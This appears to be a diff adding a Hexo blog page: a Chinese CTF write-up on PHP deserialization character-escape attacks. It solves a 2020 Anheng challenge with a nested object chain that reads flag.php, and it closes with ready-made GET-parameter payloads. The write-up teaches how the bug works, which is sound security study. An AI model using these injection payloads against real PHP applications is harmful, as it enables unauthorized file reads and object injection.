@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>PHP反序列化字符逃逸 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,反序列化">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了反序列化字符逃逸的相关内容！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">PHP反序列化字符逃逸</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+      PHP反序列化字符逃逸
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年4月25日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了反序列化字符逃逸的相关内容！</p>
+<a id="more"></a>
+
+<h2 id="什么是反序列化字符逃逸？"><a href="#什么是反序列化字符逃逸？" class="headerlink" title="什么是反序列化字符逃逸？"></a>什么是反序列化字符逃逸？</h2><p>个人理解：在反序列化之前，存在对序列化字符串的替换等操作，导致可以构造特定的字符串序列达到本来完成不了的操作，比如修改其他变量的值，注入对象。</p>
+<p><strong>举个例子：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$password = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">$s = serialize($user);</span><br><span class="line">$r = filter($s);</span><br><span class="line">$a= unserialize($r);</span><br><span class="line"><span class="keyword">if</span>($a[<span class="number">1</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>有上面一段代码，可以看到我们可控的地方只有<code>$username</code>，后面有一个filter函数替换</p>
+<p>我们知道，PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</p>
+<p>正常的序列化结果是这样的(假设u=admin):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时是没有x的，假设我们输入一个带字母x的(u=testx)，序列化经过替换就会变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;testyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时反序列化，就会失败，<code>testyy</code>的长度不是5而是6，unserialize函数返回<code>false</code></p>
+<p>但是，假如我们传入，长度为38</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?u=xxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时序列化结果是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;xxxxxxxxxxxxxxxxxxx&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过替换后序列化结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">38</span>:<span class="string">&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;i:1;s:3:&quot;</span>aaa<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时<code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>的长度刚好为38，再加上后面的<code>;i:1;s:5:&quot;admin&quot;;&#125;</code>成功反序列化，而这后面的直接忽略了</p>
+<p>那怎样算到底有多少个x呢？我用的方法是列方程😂</p>
+<p>首先我们要确定需要添加的内容，也就是后面一串，即<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>，长度为19(设为m)，满足以下式子(设有n个<code>x</code>字符，<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>前面有y个非<code>x</code>字符)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+m=<span class="number">2</span>n+y <span class="comment">// 原来字符串的长度 = 替换后去掉m的长度</span></span><br></pre></td></tr></table></figure>
+
+<p>解方程得n=19，即我们要有19个x，y随意，从等式可以看出抵消了</p>
+<p>如果碰到除不尽的情况，我们可以在<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>前面增加一些非<code>x</code>字符，类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时m的长度大于19</p>
+<h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="2020安恒四月月赛"><a href="#2020安恒四月月赛" class="headerlink" title="2020安恒四月月赛"></a>2020安恒四月月赛</h3><p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $c = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$e = serialize($a);</span><br><span class="line">$c = write($e);</span><br><span class="line">$d = read($c);</span><br><span class="line">$b = unserialize($d); </span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们可以控制GET参数a,b的值</p>
+<p>在反序列化之前，序列化字符串经过了两次替换（<code>chr(0)</code>用<code>%00</code>替换）</p>
+<p>第一次是把<code>%00*%00</code>替换成了<code>\0\0\0</code>，这里长度增加，由3变成6</p>
+<p>第二次是把<code>\0\0\0</code>替换成了<code>%00*%00</code>，这里长度减少，由6变成3</p>
+<p>先看下正常序列化的结果(a=admin,b=admin):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先我们知道，如果是嵌套的类（类里面的参数还是个类），举个例子，这里为了方便直接把读flag.php的链构造出来了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//     $c = &#x27;a&#x27;.$this-&gt;b;</span></span><br><span class="line">    <span class="comment">//     echo $c;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="comment">// function __toString()&#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents($this-&gt;c);</span></span><br><span class="line">    <span class="comment">//     return &#x27;nice&#x27;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="keyword">new</span> C;</span><br><span class="line">$c-&gt;c=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$b=<span class="keyword">new</span> B;</span><br><span class="line">$b-&gt;b=$c;</span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>此时的序列化结果是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们传的A类username属性是一个B对象，所以后面就变成了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个B对象的b属性是一个C对象，所以还能分解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明白类里面嵌套类的序列化格式，我们再来看怎末逃逸出去的。</p>
+<p>首先我们要知道的下面一串是我们需要添上去的，长度为58</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以把序列化字符串放到username那里，并且用之前那个例子变长的那种思路，但是这种方式并不行，因为经过替换之后它又替换回来了,所以我们只能用变短的思路</p>
+<p>总的思路:通俗的说就是username吃掉后面的password</p>
+<p>正常序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时我们需要添加的就变成，长度为72</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要吃掉的就是,长度23，**那里表示两位，表示password的长度</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:**:&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>列方程,n代表<code>\0\0\0</code>的数目，y表示其它字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y	<span class="comment">// 原字符长度 = 吃掉&quot;;s:8:&quot;password&quot;;s:**:&quot; + 替换后长度 </span></span><br><span class="line"><span class="comment">//	其它字符在替换时不受影响 可以不考虑</span></span><br></pre></td></tr></table></figure>
+
+<p>计算一下发现3n=23,除不尽，所以我们需要改下后面那串，前面增加点东西，类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>想获取多种payloaad，我们可以列式子，k表示增加的字符长度</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y+k</span><br></pre></td></tr></table></figure>
+
+<p>当k=1时 n=8</p>
+<p>可以构造payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以当k=4 n=9</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;abcd&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></p>
+
+          
